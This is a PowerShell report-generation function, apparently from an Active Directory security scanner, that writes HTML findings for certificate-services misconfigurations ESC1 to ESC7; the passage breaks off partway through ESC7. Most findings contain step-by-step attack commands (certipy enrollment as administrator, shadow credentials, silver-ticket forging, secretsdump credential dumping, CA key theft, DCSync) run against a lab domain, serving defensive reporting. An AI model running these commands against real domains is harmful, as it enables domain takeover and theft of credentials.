function Generate-PKIhtml {  
    param (
        [Parameter()]
        [array]$PKI,
        
        [Parameter()]
        [string]$APIkey
    )

    #gen AI prompt for remediation
    $AiSystemMessage = "You are an Active Directory security expert. I will provide you with some information relating to a vulnerability and I want you to respond with exact remediation steps to fix the specified vulnerability in html code. I don't want generic remediation, I want specific steps someone can take and follow step, by step. I want it in numbered steps that go inbetween list tags <ol><li> in html. I want no other information returned."

    if ($PKI -eq "None" -or $PKI.Score -eq 0) {
        $html = @"
        <div class="finding-header">PKI</div>
        <h2 class="novuln">No vulnerabilities found!</h2>
"@
    }
    else {
        $html = @"
        <div class="finding-header">PKI</div>
        <div class="domain-info">
        <p>This section contains technical details relating to vulnerabilities found within the Active Directory Certificate Services implementation.</p>
        </div>
        <div class="finding-container">
        <table>
            <thead>
                <tr>
                    <th class="table-header-left">Issue</th>
                    <th class="table-header-right">Risk</th>
                </tr>
            </thead>
            <tbody>
"@
        foreach ($finding in $PKI) {
             #replace console colours 
             if($finding.Risk -match "critical"){
                $finding.Risk = "Critical"
            } elseif ($finding.Risk -match "high"){
                $finding.Risk = "High"
            } elseif ($finding.Risk -match "medium"){
                $finding.Risk = "Medium"
            } elseif ($finding.Risk -match "low"){
                $finding.Risk = "Low"
            } elseif ($finding.Risk -match "informational"){
                $finding.Risk = "Informational"
            }
            $remediation = Connect-ChatGPT -APIkey $APIkey -Prompt $finding -Temperature 0.7 -AiSystemMessage $AiSystemMessage
            if ($finding.Technique -eq "ESC1") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in a vulnerable certificate template and supplying a SAN.</td>
                                        <td>TA0004, TA0003</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
                                            <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
                                            <tr><td class="grey">Enrollee Supplies Subject</td><td>True</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC1 is a vulnerability where a certificate template permits Client Authentication and allows a low-privileged enrollee to supply a different username than their own using a Subject Alternative Name (SAN) without manager approval. 
                                            A SAN is an extension that allows multiple identities to be bound to a certificate beyond just the subject of the certificate. A common use for SANs is supplying additional host names for HTTPS certificates. For example, if a web server hosts content for multiple domains, each applicable domain could be included in the SAN so that the web server only needs a single HTTPS certificate instead of one for each domain. This is all well and good for HTTPS certificates, but when combined with certificates that allow for domain authentication, a dangerous scenario can arise.</p>
                                            <p>This allows a low-privileged user to enroll in $($finding.Name) supplying a SAN of Administrator, and then authenticate as the domain administrator.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy.</p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC1-1.png"
                                                        alt="Finding ESC1">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can enroll in the certificate template specifying a UPN of a domain administrator in the SAN.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC1-template -upn administrator@test.local -dns dc.test.local</p>
                                                    <p>The low-privileged user can then use this certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator_dc.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC1-2.png"
                                                        alt="Exploiting ESC1">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -eq "ESC2") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in a vulnerable certificate template used for any purpose.</td>
                                        <td>TA0004, TA0003</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
                                            <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
                                            <tr><td class="grey">Any Purpose EKU</td><td>True</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC2 is a vulnerability where a certificate template can be used for ANY purpose for which a low-privileged user can enroll. Since the certificate can be used for any purpose, it can be used for the same technique as with ESC3 for most certificate templates. This invovles enrolling in the vulnerable certificate template, then using that enrolled certificate to enroll another certiifcate on behalf of another user (i.e a domain admin) permitted by the any purpose EKU.</p>
                                            <p>This allows a low-privileged user to enroll in $($finding.Name), then use the certificate to enroll in another certificate template on behalf of a domain admin (permitted as the certificate can be used for any purpose).</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://labs.lares.com/adcs-exploits-investigations-pt2/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy.</p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC2-1.png"
                                                        alt="Finding ESC1">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can enroll in the certificate template.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC2-template</p>
                                                    <p>The low-privileged user can then use the ANY purpose certificate to request a certificate in the "User" certificate template on behalf of a domain administrator</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template User -on-behalf-of 'test\administrator' -pfx test.pfx</p>
                                                    <p>The low-privileged user can then use this domain admin certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC2-2.png"
                                                        alt="Exploiting ESC1">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@ 
            }
            elseif ($finding.Technique -eq "ESC3") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in a vulnerable certificate template on behalf of another user.</td>
                                        <td>TA0004, TA0003</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
                                            <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
                                            <tr><td class="grey">Certificate Request Agent EKU</td><td>True</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC3 is a vulnerability where a certificate template allows a low-privileged user to enroll for a certificate on behalf of another user by specifying the Certificate Request Agent EKU. This vulnerability is present when two certificate templates can be enrolled in by low privileged user, where, one allows the Certificate Request Agent EKU (to request certificate on behalf of other user) and another allows client authentication.</p>
                                            <p>This allows a low-privileged user to enroll in $($finding.Name), then use the certificate obtained to request an additional certificate (co-sign a Certificate Signing Request (CSR)) on behalf of a domain admin in another template used for client authentication to impersonate them.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://labs.lares.com/adcs-exploits-investigations-pt2/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy. 
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC3-1.png"
                                                        alt="Finding ESC3">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can enroll in the certificate template that permits enrolling on behalf of another user (ESC3-CRA - has the Certificate Request Agent EKU).</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC3-CRA</p>
                                                    <p>The low-privileged user can this obtained certificate to request a certificate in another template that allows authentication (ESC3-template) on behalf of a domain adminstator.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC3-template -on-behalf-of 'test\Administrator' -pfx test.pfx</p>
                                                    <p>The low-privileged user can then use this domain admin certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC3-2.png"
                                                        alt="Exploiting ESC3">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@
            }
            elseif ($finding.Technique -eq "ESC4") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users have unsafe permissions over a certificate template allowing impersonation of a domain administrator.</td>
                                        <td>TA0004, TA0003</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
"@
                #Account for owner rights
                if ($finding.Issue -match "Owner") {
                    $html += @"
                        <td class="relevantinfo"><table>
                        <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
                        <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
                        <tr><td class="grey">Owner</td><td>$($finding.Owner)</td></tr>
                    </table></td>
                    <td class="explanation">
                                            <p>ESC4 is a vulnerability where low privileged users have unsafe permissions over a certificate template, giving them full control of the template. $($finding.Owner) has Owner rights over $($finding.Name), giving full control of the template.</p>
                                            <p>This allows a low-privileged user to modify $($finding.Name) to be vulnerable to ESC1, enroll and supply a SAN of Administrator, and then authenticate as the domain administrator.</p> 
"@
                }
                else {
                    $html += @"
                        <td class="relevantinfo"><table>
                        <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
                        <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
                        <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                        <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                    </table></td>
                    <td class="explanation">
                                            <p>ESC4 is a vulnerability where low privileged users have unsafe permissions over a certificate template, giving them full control of the template. $($finding.IdentityReference) has $($finding.ActiveDirectoryRights) over $($finding.DistinguishedName), giving full control of the template.</p>
                                            <p>This allows a low-privileged user to modify $($finding.Name) to be vulnerable to ESC1, enroll and supply a SAN of Administrator, and then authenticate as the domain administrator.</p> 
"@
                }
                $html += @"
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://redfoxsec.com/blog/exploiting-weak-acls-on-active-directory-certificate-templates-esc4/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy. 
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC4-1.png"
                                                        alt="Finding ESC4">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can take the ESC4 template and change it to be vulnerable to ESC1 technique by using the unsafe permission over the template.</p>
                                                    <p class="code">python3 entry.py template -u test@test.local -p 'Password123!' -template ESC4ACL-template -save-old</p>
                                                    <p>The low-privileged user can then use the template to exploit ESC1, enroll in the modified certificate template specifying a UPN of a domain administrator in the SAN.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC4ACL-Template -upn administrator@test.local</p>
                                                    <p>The low-privileged user can then use this domain admin certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC4-2.png"
                                                        alt="Exploiting ESC4">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@
            }
            elseif ($finding.Technique -eq "ESC5") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can take control of a certificate authority and craft certificates for a domain administrator.</td>
                                        <td>TA0004, TA0003</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
                                            <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC5 is a vulnerability where a low privileged user has unsafe rights over PKI objects such as the CA object in AD. $($finding.IdentityReference) has $($finding.ActiveDirectoryRights) over $($finding.DistinguishedName), giving full control of the certificate authority, and the domain PKI which is a tier 0 asset (as important as a domain controller).</p>
                                            <p>Compromise of a certificate authority allows a user extract the CA private key and use it to forge authentication certificates for any domain user, allowing impersonation of a domain administrator.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/#esc5">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can search for rogue permissions such as GenericWrite, GenericAll or WriteDacl over CA objects using bloodhound.</p> 
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC5-1.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. With these permissions, the user can add shadow credentials to the CA object to obtain a certificate as the CA server. This will update the msDS-KeyCredentialLink of the CA with a key-pair, effectively backdooring the account.</p> 
                                                    <p class="code">python3 pywhisker.py -d test.local -u test -p 'Password123!' --target 'ca$' --action add --dc-ip dc.test.local</o>
                                                   
                                                    <p>With the shadow credentials updated with the key-pair, these can be used to request a TGT via PKINIT for the CA.</p>
                                                    <p class="code">python3 gettgtpkinit.py test.local/'ca$' -cert-pfx ../pywhisker/hguhjXMA.pfx -pfx-pass kE2JBsYrnlfjY1iXzZQn out.ccache</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC5-2.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. With the TGT obtained from shadow credentials, the NTLM hash of the certificate authority can be retrieved via unpac-the-hash.</p> 
                                                    <p class="code">export KRB5CCNAME=out.ccache</p>                                                                                                                    
                                                    <p class="code">python3 getnthash.py -key 07df53520ac65b82c309918e26f8c4384086af39f6ff264809cb2c186b0162e9 test.local/'ca$'</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC5-3.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>4. With the CA authority NTLM hash, a silver ticket can be forged for the HOST service to impersonate the domain administrator for that service.</p> 
                                                    <p class="code">impacket-ticketer -domain-sid S-1-5-21-1189352953-3643054019-2744120995 -domain test.local -spn HOST/ca.test.local -nthash 6e8d0d396333b90e8c05efebc4f0fd70 -user-id 500 Administrator</p>

                                                    <p>The silver ticket can be used for the HOST service to dump credentials with secretsdump and extract the local administrator credentials to gain admin access to the PKI.</p>
                                                    <p class="code">export KRB5CCNAME=Administrator.ccache</p>
                                                    <p class="code">impacket-secretsdump 'administrator'@ca.test.local -k -no-pass<p>

                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC5-4.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>5. With admin access to the CA, the CA certificate and private key can be extracted remotely with certipy.</p>
                                                    <p class="code">certipy ca -backup -ca 'test-CA-CA' -username administrator@ca.test.local -hashes :2b576acbe6bcfda7294d6bd18041b8fe</p>
                                                    
                                                    <p> The CA private key can then be used to forge a certificate for a domain administrator.</p>
                                                    <p class="code">certipy forge -ca-pfx test-CA-CA.pfx -upn administrator@test.local -subject 'CN=Administrator,CN=Users,DC=test,DC=local'</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC5-5.png"
                                                        alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>Whilst the certificate may not be directly usable due to lack of PKINIT,  the certificate can be used with Schannel authentication with pass-the-cert to grant a low-privileged user DCSync rights, first extracting the CA's certificate and private key from the unuseable pfx.</p>
                                                    <p class="code">certipy cert -pfx administrator_forged.pfx -nokey -out administrator.crt</p>                                                                                                                                                       
                                                    <p class="code">certipy cert -pfx administrator_forged.pfx -nocert -out administrator.key</p>                                                                                                                                                        
                                                    <p class="code">python3 /home/kali/Desktop/passthecert.py -action modify_user -crt administrator.crt -key administrator.key -target test -elevate -domain test.local -dc-ip 192.168.10.141</p>
                                                    
                                                    <p>With DCSync privileged granted the low-priivleged user can extract all password hashes from the domain, showing how ESC5 can fully compomise the domain.</p>    
                                                    <p class="code">impacket-secretsdump test:'Password123!'@dc.test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC5-6.png" alt="Exploiting ESC5">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@
            }
            elseif ($finding.Technique -eq "ESC6") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Certificate Authority has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set allowing low-privileged users to impersonate a domain admin.</td>
                                        <td>TA0004, TA0003</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">CA Name</td><td>$($finding."CAName")</td></tr>
                                            <tr><td class="grey">CA hostname</td><td>$($finding."CAhostname")</td></tr>
                                            <tr><td class="grey">EDITF_ATTRIBUTESUBJECTALTNAME2</td><td>True</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC6 is a vulnerability within ADCS where a Certificate Authority has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set. This flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template's configuration, meaning any certificate that permits client authentication are vulnerable to ESC1 even if they do not allow a user to supply a SAN.</p>
                                            <p>This allows a low-privileged user to enroll in any authentication template supplying a SAN of Administrator, and then authenticate as the domain administrator.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://redfoxsec.com/blog/exploiting-active-directory-certificate-services-ad-cs/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate domain certificate authorities that have the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set using certipy. 
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC6-1.png" alt="Finding ESC6">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. Just as in ESC1, a low-privileged user can enroll in any certificate template used for authentication, specifying a UPN of a domain administrator in the SAN.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template User -upn administrator@test.local -dns dc.test.local</p>
                                                             
                                                    <p>The low-privileged user can then use this certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator_dc.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/PKI/ESC6-2.png" alt="Exploiting ESC6">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@
            }
            elseif ($finding.Technique -eq "ESC7") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user has Manage CA or Manage Certificate rights allowing impersonation of a domain admin.</td>
                                        <td>TA0004, TA0003</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
